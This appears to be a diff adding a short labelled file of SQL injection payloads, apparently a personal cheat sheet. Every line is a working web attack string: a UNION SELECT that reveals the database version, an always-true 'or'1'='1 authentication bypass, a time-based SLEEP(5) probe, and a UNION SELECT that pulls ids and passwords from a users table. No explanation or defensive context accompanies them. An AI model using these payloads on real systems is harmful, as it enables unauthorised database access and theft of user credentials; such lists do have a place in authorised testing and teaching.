@@ -1,0 +1,15 @@
+getversion
+
+' UNION SELECT NULL, NULL, @@version;--
+
+getUser1
+
+test'or'1'='1
+
+Sleep 5
+
+' UNION SELECT NULL, NULL, SLEEP(5);-- 
+
+getPass
+
+' UNION SELECT id, null, password FROM users;--
